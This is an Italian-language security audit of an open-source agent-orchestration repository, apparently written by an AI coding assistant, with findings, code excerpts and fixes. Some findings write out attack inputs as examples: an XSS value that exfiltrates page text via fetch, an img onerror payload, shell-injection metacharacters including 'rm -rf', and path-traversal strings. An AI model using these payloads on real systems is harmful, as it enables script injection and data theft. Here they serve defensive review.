# Revisione di sicurezza, privacy e qualità — `vibe-multiagent-public`

**Revisore**: Claude Opus 5 (Claude Code)
**Data**: 2026-09-11
**Ambito**: tutti i file `.mjs`, `.md`, `.yml`, `.json`, `.html` in `tools/`, `templates/`, `tools/test/` e radice (36 file, ~3.745 righe)
**Metodo**: lettura integrale del codice, grep mirati su pattern di privacy, verifica empirica (esecuzione `npm test`, test di path traversal e di payload malformati), analisi del template HTML della dashboard.

---

## Verdetto sintetico

**Il repository è pronto per la pubblicazione open-source. Nessun finding CRITICO (bloccante).**

Le verifiche di privacy richieste sono risultate **tutte negative**: nessun riferimento ad alias personali precedenti, nomi di progetti privati, percorsi Windows personali, o credenziali. Le uniche occorrenze di dati personali sono legittime (copyright, `author` in `package.json`, URL del repository GitHub).

Restano **3 finding ALTO** (fortemente raccomandati prima della pubblicazione, tutti risolvibili in poche ore) e **8 MEDIO**.

| Severità | Conteggio |
|---|---|
| 🔴 CRITICO (bloccante) | 0 |
| 🟠 ALTO (forte raccomandazione) | 3 |
| 🟡 MEDIO (miglioramento) | 8 |
| 🔵 BASSO (nice to have) | 10 |
| 🟢 INFO (punti di forza) | 11 |

---

## 🔴 CRITICO — Bloccanti

**Nessun finding.**

In particolare, le quattro aree di rischio più comuni per un framework di questo tipo risultano già presidiate correttamente:
- nessun segreto, token o credenziale nel repository;
- nessun leak di percorsi o progetti privati dell'autore;
- nessuna XSS sfruttabile dai campi che gli agenti controllano (task, log, proprietari);
- nessun path traversal nel runner.

---

## 🟠 ALTO — Forte raccomandazione

### A-1 — `runner.mjs`: la ricomposizione dei token dopo `--` è fragile su Windows e non neutralizza i metacaratteri di shell

**File**: `tools/runner.mjs:20-24`

```js
const cmdTokens = args.slice(doppioTrattino + 1);
cmd = cmdTokens
  .map((tok) => (/[\s"']/.test(tok) ? `"${tok.replace(/"/g, '\\"')}"` : tok))
  .join(" ");
```

Il comando viene ricomposto in **una singola stringa** e poi passato a `spawn(cmd, { shell: true })` (riga 81). Due problemi distinti:

1. **Quoting errato su Windows.** L'escape `\"` è la convenzione POSIX; `cmd.exe` non la riconosce (usa `""` o `^"`). Un token contenente virgolette — per esempio un prompt `-- claude -p 'Esegui il task "T-042"'` — viene ricomposto in modo che `cmd.exe` interpreta diversamente da `bash`. Questo è rilevante perché la forma `-- <comando>` è **documentata come uso raccomandato** (`setup_skill.md:445`) e il framework è primariamente Windows/Antigravity.

2. **Metacaratteri non neutralizzati.** Un token senza spazi né virgolette viene concatenato **grezzo**: `foo;rm -rf x`, `$(cmd)`, `` `cmd` ``, `&&`, `|` passano intatti alla shell. Non è un'escalation di privilegi (chi invoca il runner può già eseguire comandi), ma è un canale di esecuzione non intenzionale quando il comando è composto da un modello a partire dal testo di un task — cioè esattamente lo scenario del framework.

**Rimedio consigliato**: non ricomporre. Conservare `cmdTokens` come array e usare `spawn(cmdTokens[0], cmdTokens.slice(1), { shell: false })` quando si entra dalla forma `--`, riservando `shell: true` alla sola forma `--cmd "<stringa>"` (dove la stringa è esplicitamente shell per volontà del chiamante). In alternativa, se si vuole mantenere una sola strada, usare `shell: true` ma citare con le regole della piattaforma (`process.platform === "win32"` → `""`).

---

### A-2 — I log e `state.json` possono contenere segreti, e nulla lo dichiara

**File**: `tools/runner.mjs:63-99`, `tools/telemetry.mjs:164-180`, `SECURITY.md`

Il runner scrive su `{{DIR_COORD}}/logs/<ID>.log`:
- la **riga di comando completa** (riga 67: `Comando: ${cmd}`) — che può includere chiavi API passate inline, token, percorsi assoluti dell'utente;
- **tutto** lo stdout/stderr dell'esecutore, che per una CLI di agente include frammenti di file, output di `env`, messaggi di errore con credenziali.

`telemetry.mjs` poi copia le **ultime 40 righe di ogni log** dentro `state.json` e `state.js` (riga 176).

`SECURITY.md` afferma correttamente «Esecuzione 100% locale» e «nessun tracking nascosto», ma **non avverte** che questi artefatti locali sono potenzialmente sensibili. Tre conseguenze pratiche non documentate:

- un utente che apre la dashboard con **Live Server** espone `state.json` e `state.js` su una porta HTTP; la configurazione di default di alcune estensioni si lega a `0.0.0.0`, rendendo i log leggibili dalla LAN;
- un utente che condivide `state.json` per debug (la dashboard ha un pulsante «📁 Carica file» che invita a questo) condivide anche i log;
- `.gitignore` è corretto (`setup_skill.md:395-398` esclude `state.json`, `state.js`, `logs/`), ma solo se l'agente esegue davvero quel passo: è un'istruzione in linguaggio naturale, non un meccanismo.

**Rimedio consigliato**:
1. aggiungere a `SECURITY.md` una sezione «Dati locali prodotti dal framework» che elenchi i tre artefatti, dichiari che possono contenere output sensibile e ricordi di non allegarli a issue pubbliche;
2. nella dashboard, accanto al pulsante di caricamento file, una nota «i log possono contenere output sensibile»;
3. valutare il mascheramento della riga `Comando:` nel log (es. redigere token simili a `sk-...`, `ghp_...`), oppure ometterla dietro un flag.

---

### A-3 — `CODE_OF_CONDUCT.md`: il canale di segnalazione non è riservato e mancano le Enforcement Guidelines

**File**: `CODE_OF_CONDUCT.md:26,30`

Il testo attuale:

> «possono essere segnalati aprendo una **segnalazione riservata** o contattando i maintainer tramite i canali ufficiali del repository GitHub ([Segnalazioni / Issues](.../issues))»

Il link punta al **tracker pubblico delle issue**: una segnalazione di molestia aperta lì è visibile a chiunque, il che contraddice la parola «riservata» e, in pratica, scoraggia la segnalazione — che è esattamente il fallimento che un CoC deve evitare. Non esiste nel repository alcun canale privato dichiarato per la condotta (`SECURITY.md:35` rimanda a un'email «indicata sul profilo GitHub», ma riguarda le vulnerabilità).

Inoltre il documento dichiara di essere «adattato dal Contributor Covenant versione 2.1» ma **omette la sezione Enforcement Guidelines** (la scala a quattro livelli: Correzione / Avvertimento / Ban temporaneo / Ban permanente), che nella 2.1 è parte integrante del testo. Un CoC senza scala di conseguenze lascia l'enforcement indeterminato, e l'attribuzione risulta imprecisa.

**Rimedio consigliato**:
1. sostituire il link alle issue con un canale realmente privato: un indirizzo email dedicato al progetto (anche un alias), oppure abilitare le **GitHub Private Vulnerability Reports** / **Discussions** private e linkare quello;
2. incollare integralmente la sezione *Enforcement Guidelines* della 2.1 e aggiungere i link canonici a FAQ e traduzioni, come richiesto dalla nota di attribuzione del Covenant.

---

## 🟡 MEDIO — Miglioramenti

### M-1 — `runner.mjs`: exit code su segnale sempre `143`, indipendentemente dal segnale ricevuto

**File**: `tools/runner.mjs:118`

```js
const exitCode = code !== null ? code : (signal ? 128 + 15 : 1);
```

La costante `15` è SIGTERM cablata. Se il processo figlio termina per **SIGINT** (Ctrl-C — il caso più frequente, gestito esplicitamente alle righe 128-131), il runner riporta `143` invece di `130`; per SIGKILL riporta `143` invece di `137`. Poiché il protocollo del framework insiste sul fatto che l'orchestratore non deve fidarsi del solo exit code ma neppure interpretarlo male (`DISPATCH.md.template:88`, `README.md:237`), un codice di segnale sbagliato è precisamente il tipo di segnale fuorviante che il protocollo cerca di eliminare.

**Rimedio**: mappare il segnale al suo numero, per esempio tramite `os.constants.signals`:

```js
import { constants } from "node:os";
const numSegnale = constants.signals[signal];
const exitCode = code !== null ? code : (numSegnale ? 128 + numSegnale : 1);
```

---

### M-2 — Dashboard: l'unico campo interpolato senza escape è l'attributo `class` del badge di stato

**File**: `templates/dashboard.html.template:609,615`

```js
const badgeClass = 'badge-' + statoNorm.replace(/\s+/g, '-');
...
<span class="task-badge ${badgeClass}" ...>
```

Tutti gli altri campi passano da `escapeHtml()` (verificato riga per riga: `id`, `titolo`, `proprietario`, `stoPer`, `fatti`, `statoEsteso`, `name`, `defaultRole`, `currentTask`, chiavi dei log). Questo no.

**Non è sfruttabile dai task**: `telemetry.mjs:52-54` normalizza lo stato contro una whitelist (`PRONTO|IN CORSO|CONSEGNATO|INTEGRATO|SOSPESO|CHIUSO`), con fallback a `SCONOSCIUTO`. Un agente ostile che scrive `Stato: X" onmouseover="…` in un task ottiene `SCONOSCIUTO`.

**È però sfruttabile** attraverso i due percorsi in cui la dashboard accetta JSON arbitrario senza passare da `telemetry.mjs`: il drag & drop (righe 686-702) e il pulsante «📁 Carica file» (righe 710-729). Un `state.json` malevolo con `"stato": "X\" onmouseover=\"fetch('http://…'+document.body.innerText)"` esegue codice nell'origine della dashboard — che su `file://` o su Live Server ha accesso agli altri artefatti locali.

**Rimedio**: whitelist anche lato client, che è una riga:

```js
const STATI_NOTI = ['PRONTO','IN CORSO','CONSEGNATO','INTEGRATO','SOSPESO','CHIUSO'];
const badgeClass = 'badge-' + (STATI_NOTI.includes(statoNorm) ? statoNorm.replace(/\s+/g,'-') : 'SCONOSCIUTO');
```

---

### M-3 — I segnaposto `{{NOME_PROGETTO}}` e `{{DIR_COORD}}` sono sostituiti in HTML senza escape

**File**: `templates/dashboard.html.template:6,367,368`; `setup_skill.md:437`

L'istruzione di setup è «sostituendo eventuali occorrenze di `{{NOME_PROGETTO}}` con il nome reale del progetto (o il nome della cartella)». La sostituzione è testuale e finisce dentro `<title>` e `<h1>`. Un nome di progetto o di cartella contenente `<` o `"` produce HTML malformato; nel caso patologico (`<img src=x onerror=…>`) produce esecuzione di script.

Il rischio reale è basso — il nome viene dall'utente stesso — ma il costo del rimedio è zero.

**Rimedio**: in `setup_skill.md`, istruire esplicitamente di applicare l'escape HTML (`&`, `<`, `>`, `"`) al valore prima di inserirlo in `dashboard.html`, oppure di limitarlo a `[A-Za-z0-9 _.-]`.

---

### M-4 — `telemetry.mjs` rilegge integralmente ogni file di log ogni 2 secondi, senza limite di dimensione

**File**: `tools/telemetry.mjs:169-177`, invocato da `tools/runner.mjs:75-79`

```js
const content = readFileSync(lPath, "utf8");
const righe = content.split(/\r?\n/).filter(Boolean);
logs[taskId] = righe.slice(-40);
```

Per ottenere **40 righe** si carica in memoria l'intero file, si splitta l'intera stringa e si scarta tutto il resto. Il runner fa partire questa scansione con `setInterval(…, 2000)` **per tutti i log presenti**, non solo per quello del task corrente. Una CLI di agente verbosa produce facilmente decine di MB in una sessione lunga: a quel punto, ogni 2 secondi, si allocano e si scartano decine di MB in un processo che sta anche facendo da pipe all'output. Non c'è né rotazione né tetto di dimensione sui log.

**Rimedio**: leggere solo la coda del file con `open()`/`read()` su un buffer di dimensione fissa (es. ultimi 64 KB) posizionato con `statSync(lPath).size`, e aggiungere una rotazione o un tetto (es. troncamento a 10 MB) nel runner.

---

### M-5 — `quota-anthropic.mjs`: il payload mock non viene validato come oggetto

**File**: `tools/quota-anthropic.mjs:41-57`

La gestione del **JSON malformato** è corretta e verificata empiricamente:

```
$ VIBE_MOCK_QUOTA_PAYLOAD='{nonjson' node tools/quota-anthropic.mjs
{"ok":false,"source":"error",…,"note":"VIBE_MOCK_QUOTA_PAYLOAD non è un JSON valido: …"}   exit=0
```

Manca però la validazione della **forma**: un JSON valido ma scalare passa inalterato.

```
$ VIBE_MOCK_QUOTA_PAYLOAD='"pwn"' node tools/quota-anthropic.mjs
"pwn"   exit=0
```

A valle, `telemetry.mjs:188` assegna quel valore a `quota`, che finisce in `state.json` come stringa dove lo schema prevede un oggetto. Ho verificato che né la dashboard né `agy-quota-banner.mjs` vanno in crash (l'accesso a proprietà di una stringa restituisce `undefined`, gestito dai fallback), quindi l'impatto è contenuto a uno `state.json` fuori schema. Resta un buco nel contratto di un file che è l'unica interfaccia dati fra backend e dashboard.

**Rimedio**: dopo il `JSON.parse`, verificare `typeof mock === "object" && mock !== null && !Array.isArray(mock)` e altrimenti emettere lo stesso ramo d'errore già esistente.

---

### M-6 — Tre comportamenti di sicurezza rilevanti non hanno copertura di test

**File**: `tools/test/`

La suite passa integralmente (verificato su Node 24.15.0: `agy-gate` 11, `agy-checkpoint` 4, `quota-anthropic` 3, `agy-quota-banner` 1, più `telemetry` e `runner`, tutti verdi) ed è deterministica e offline — un punto di forza. Ma i tre comportamenti che questa revisione ha dovuto verificare **a mano** sono proprio quelli non coperti:

| Comportamento | Dove vive | Test |
|---|---|---|
| Sanitizzazione di `taskId` contro path traversal | `runner.mjs:43-44` | ❌ assente |
| Ramo d'errore su `VIBE_MOCK_QUOTA_PAYLOAD` malformato | `quota-anthropic.mjs:46-56` | ❌ assente |
| Exit code su terminazione da segnale | `runner.mjs:118` | ❌ assente |

Un presidio di sicurezza senza test è un presidio che la prossima rifattorizzazione può rimuovere in silenzio. `runner.test.mjs` copre il caso felice e la propagazione di `exit 7`, ma non il traversal.

**Rimedio**: tre asserzioni brevi. Per il traversal, la forma verificata in questa revisione:

```js
const r3 = spawnSync(process.execPath, [runnerScript, "--task", "../../../pwned",
  "--coord", coordDir, "--cmd", 'node -e "1"'], { cwd: testDir, encoding: "utf8" });
assert.ok(existsSync(join(coordDir, "logs", "pwned.log")));
assert.ok(!existsSync(join(testDir, "..", "pwned.log")));
```

---

### M-7 — `SECURITY.md`: il canale di segnalazione vulnerabilità è indiretto

**File**: `SECURITY.md:31-36`

> «contatta direttamente il maintainer all'indirizzo email indicato sul profilo GitHub»

Il profilo GitHub può non esporre alcuna email; l'istruzione è quindi condizionata a uno stato esterno non verificabile dal lettore. La promessa di «riscontro entro 48 ore lavorative» è inoltre impegnativa per un progetto a maintainer singolo: se non viene mantenuta, è un debito di credibilità.

**Rimedio**: abilitare nelle impostazioni del repository **Private vulnerability reporting** (Settings → Security → Private vulnerability reporting) e linkare direttamente `https://github.com/<owner>/<repo>/security/advisories/new`, canale privato garantito e indipendente dal profilo. Ammorbidire la SLA in «entro 7 giorni» oppure dichiararla best-effort.

---

### M-8 — `runner.mjs`: nessun gestore `error` sullo stream di log

**File**: `tools/runner.mjs:63`

```js
const streamLog = createWriteStream(pathLog, { flags: "a", encoding: "utf8" });
```

Uno stream Node senza listener su `'error'` emette un'eccezione non catturata che **termina il processo**. Scenari realistici su Windows: percorso oltre `MAX_PATH` (frequente con `.coord` dentro OneDrive, situazione che il progetto stesso documenta come problematica in `README.md:257`), cartella in sola lettura, lock di sincronizzazione. In quei casi il runner muore invece di limitarsi a perdere i log — trascinandosi dietro l'esecutore, che è il lavoro vero.

La creazione della directory è già difesa da `try/catch` (righe 56-60), il che rende l'assenza di difesa sullo stream un'asimmetria evidente.

**Rimedio**: `streamLog.on("error", () => {})`, eventualmente con un avviso su stderr, degradando alla sola console.

---

## 🔵 BASSO — Nice to have

**B-1 — `agy-checkpoint.mjs:59,60,62`: pattern di sostituzione non neutralizzati.** `testo.replace(/^- Fatti:.*$/m, riga)` interpreta dentro `riga` le sequenze `$&`, `$1`, `` $` ``. `riga` contiene l'output di `git status --short`, quindi un nome di file contenente `$&` produce una sostituzione corrotta. Rimedio: `replace(re, () => riga)`.

**B-2 — `agy-gate.mjs:46`: `resolve()` usa il cwd del processo hook.** I percorsi relativi nei comandi di cancellazione vengono risolti contro il cwd dell'hook, che non coincide necessariamente con `workspacePaths[0]`. L'errore cade dal lato prudente (`ask` invece di `allow`), quindi è un problema di attrito, non di sicurezza. Rimedio: `resolve(radici[0], pulito)`.

**B-3 — `quota-anthropic.mjs:19`: cache con nome prevedibile in `tmpdir()`.** `quota-anthropic-vibe.json` in una directory temporanea condivisa: su un host multi-utente un altro utente può pre-creare il file o un symlink. Il contenuto è solo la percentuale di quota (nessun token), quindi l'impatto è nullo in lettura e limitato a un'informazione falsa. Rimedio: includere `userInfo().uid` nel nome, o spostare la cache in `{{DIR_COORD}}`.

**B-4 — CI: action non ancorate a SHA.** `actions/checkout@v4` e `actions/setup-node@v4` sono tag mutabili. Con `permissions: contents: read` il rischio è minimo, ma l'ancoraggio a SHA è la pratica raccomandata da GitHub. Aggiungere anche `timeout-minutes: 10` al job: una matrice 3×3 senza timeout può occupare i runner per ore in caso di blocco.

**B-5 — CI: `fail-fast` implicito.** Il default `true` cancella le altre 8 combinazioni al primo fallimento, nascondendo se un bug è specifico di una piattaforma o generale — informazione preziosa proprio in un progetto che rivendica la portabilità cross-platform. Aggiungere `fail-fast: false`.

**B-6 — Node 18 è EOL.** `engines: ">=18.0.0"` e matrice `[18.x, 20.x, 22.x]`: Node 18 è uscito dal supporto ad aprile 2025 e non riceve più patch di sicurezza. Il codice è comunque scritto correttamente per quella baseline (vedi I-5). Suggerimento: aggiungere `24.x` alla matrice e valutare se documentare Node 18 come «supportato ma non raccomandato».

**B-7 — `package.json`: mancano `files` e `private`.** Il pacchetto non sembra destinato a npm (si installa via `git clone` in `~/.claude/skills/`). Senza `"private": true` un `npm publish` accidentale pubblicherebbe l'intero repository. Minore: `repository.url` per convenzione npm va scritto `git+https://…`.

**B-8 — `telemetry.mjs:205-209`: generazione di `state.js` per concatenazione.** `JSON.stringify` non fa escape di `U+2028`/`U+2029` (validi in JSON, storicamente invalidi come letterali in JS) né di `</script>`. Oggi è innocuo perché `state.js` è caricato come script **esterno** (righe 7 e 505 del template), non inline: `</script>` non chiude nulla e U+2028 è legale da ES2019. Resta una fragilità latente se un domani qualcuno inlinasse il contenuto. Rimedio a costo zero: `.replace(/\u2028/g,'\\u2028').replace(/\u2029/g,'\\u2029').replace(/</g,'\\u003c')`.

**B-9 — Dashboard: uso di `alert()`.** Righe 697 e 724. Funziona, ma in un'anteprima IDE o in un contesto automatizzato un dialog modale blocca l'interazione. Sostituire con un messaggio inline nel banner già presente (`#corsBanner`).

**B-10 — `README.md:318-362`: l'albero del repository omette `tools/test/fixtures/T-999.md`.** Unica imprecisione riscontrata; per il resto l'albero corrisponde esattamente al contenuto reale.

*(Non conteggiati, opzionali per un progetto giovane: assenza di `.github/ISSUE_TEMPLATE/`, `PULL_REQUEST_TEMPLATE.md`, `CODEOWNERS` e Dependabot — quest'ultimo di scarso valore data l'assenza totale di dipendenze.)*

---

## 🟢 INFO — Punti di forza

**I-1 — Privacy: pulizia confermata.** I grep mirati su vecchi alias personali, nomi di progetti privati, `acard`, `C:\Users`, `/Users/`, `OneDrive`, `carducci`, indirizzi email e domini restituiscono **esclusivamente** occorrenze legittime: copyright MIT in `LICENSE`, campo `author` in `package.json`, URL del repository GitHub pubblico, `test@example.com` in `agy-checkpoint.test.mjs` (dominio riservato dalla RFC 2606, uso corretto), e due menzioni tecniche di «OneDrive» come nota di resilienza filesystem. Nessun percorso assoluto della macchina dell'autore, nessun nome di progetto privato.

**I-2 — Path traversal nel runner: presidiato, e verificato empiricamente.** `runner.mjs:43-44` applica una whitelist (`[^a-zA-Z0-9_-]` → rimosso) con fallback su stringa vuota. È la forma corretta: whitelist, non blacklist, e con default sicuro. Verifica eseguita durante questa revisione:

```
$ node runner.mjs --task "../../../pwned" --cmd "node -e 'console.log(1)'"
→ .coord/logs/pwned.log     (nessun file creato fuori da .coord/logs/)
```

**I-3 — Dashboard: XSS presidiata correttamente sui campi controllati dagli agenti.** `escapeHtml()` (riga 526) copre le cinque entità rilevanti ed è applicata a **tutti** i campi di testo interpolati in `innerHTML`. Il corpo del terminale usa `innerText` (riga 662), non `innerHTML`. Soprattutto: **nessun `onclick` inline** — la gestione dei click passa da una *event delegation* su `data-task-id` (righe 677-682), con il commento che documenta la scelta («elimina XSS da doppio contesto HTML/JS»). È esattamente l'architettura giusta, e l'unica lacuna residua è quella dell'attributo `class` (M-2).

**I-4 — Sensore di quota: opt-in reale, documentato in cinque punti coerenti.** Il default è disattivato (`quota-anthropic.mjs:28`), lo script esce sempre con codice 0 per non bloccare mai il chiamante, e `telemetry.mjs:184` ricontrolla la variabile d'ambiente **prima** di invocarlo — doppia barriera. L'opt-in è documentato in `SECURITY.md:12-18`, `README.md:282`, `README.en.md:89`, `setup_skill.md:424` e `templates/DISPATCH.md.template:77`, con il medesimo nome di variabile ovunque. Il commento in testa al file dichiara esplicitamente il perimetro («NON scansiona né legge mai i file delle conversazioni»), e il codice lo rispetta: l'unica lettura è `~/.claude/.credentials.json`, l'unica chiamata di rete è l'endpoint di usage, il token non viene mai né loggato né messo in cache (la cache contiene solo le percentuali).

**I-5 — Compatibilità Node 18: corretta ovunque.** `import.meta.dirname ?? dirname(fileURLToPath(import.meta.url))` è applicato in **tutti e sette** i file che ne hanno bisogno (`telemetry.mjs`, `agy-quota-banner.mjs` e i cinque test). Nessun uso di API più recenti della baseline dichiarata: `fetch` globale e `AbortSignal.timeout` sono entrambi disponibili da Node 18, il top-level await è nativo negli `.mjs`. Nessun `require()` residuo in un pacchetto `"type": "module"`.

**I-6 — CI: `permissions` e `concurrency` già configurati correttamente.** `permissions: contents: read` a livello di workflow è il principio del minimo privilegio applicato bene (nessun job ha bisogno di più). `concurrency` con `cancel-in-progress: true` e group per workflow+ref evita l'accumulo di run su push ravvicinati. La matrice 3 SO × 3 versioni di Node è una copertura seria per un progetto che rivendica la portabilità.

**I-7 — Zero dipendenze, e l'impegno è scritto.** `package.json` non ha né `dependencies` né `devDependencies`; `CONTRIBUTING.md:8` lo eleva a regola per i contributori. Per un framework che si installa nella home directory dell'utente e gira come hook a ogni tool call, l'assenza di superficie di supply chain è la decisione di sicurezza più importante del progetto.

**I-8 — Suite di test deterministica e offline.** `npm test` passa integralmente. I test di quota sono esplicitamente progettati per non toccare la rete (mock via variabile d'ambiente) e per non dipendere dalle credenziali reali (test con `HOME`/`USERPROFILE` reindirizzati). `telemetry.test.mjs` include casi di formattazione mista e reale, non solo fixture pulite.

**I-9 — Copertura dei segnaposto completa.** Tutti i 61 segnaposto `{{…}}` usati nei template sono mappati nella tabella di `setup_skill.md`. Nessun segnaposto orfano, nessuna sostituzione non documentata. Il passo 9 della procedura prescrive anche una ricerca dei segnaposto residui dopo la generazione.

**I-10 — Modello di minaccia di `agy-gate` dichiarato onestamente.** Sia il commento in testa al file (righe 4-5) sia `SECURITY.md:26-27` dichiarano che il gate è «un presidio di coordinamento di cantiere, non una sandbox di isolamento ostile», e rimandano a container per il codice non fidato. Un guardrail che documenta i propri limiti vale più di uno che promette un perimetro che non ha — e questo progetto ha scelto la strada giusta.

**I-11 — Igiene di repository completa.** `.gitignore` esclude correttamente `.coord/`, `.env*` (con eccezione per `.env.example`), log, artefatti IDE e `node_modules/`. `.gitattributes` normalizza i fine riga a LF con marcatura dei binari — rilevante per un progetto sviluppato su Windows e testato su tre SO. Sono presenti `LICENSE` (MIT), `SECURITY.md`, `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, README bilingue con link incrociato, e `CONTRIBUTING.md:13` stabilisce esplicitamente il divieto di percorsi assoluti e riferimenti a progetti privati — la regola che questa revisione ha trovato rispettata.

---

## Piano d'azione consigliato

**Prima della pubblicazione** (~2-3 ore):
1. A-3 — canale privato per il CoC + Enforcement Guidelines del Covenant 2.1
2. A-2 — sezione «Dati locali prodotti dal framework» in `SECURITY.md`
3. M-7 — abilitare Private Vulnerability Reporting e linkarlo
4. M-2 — whitelist degli stati lato dashboard (una riga)

**Prima o subito dopo** (~3-4 ore):
5. A-1 — `spawn` con array per la forma `--`
6. M-1 — exit code da `os.constants.signals`
7. M-6 — tre test di regressione (traversal, mock malformato, segnale)
8. M-8 — gestore `error` sullo stream di log

**Backlog**: M-3, M-4, M-5 e la serie BASSO.

Nessuno di questi punti giustifica un rinvio della pubblicazione. Il repository è, nella sostanza, pulito.
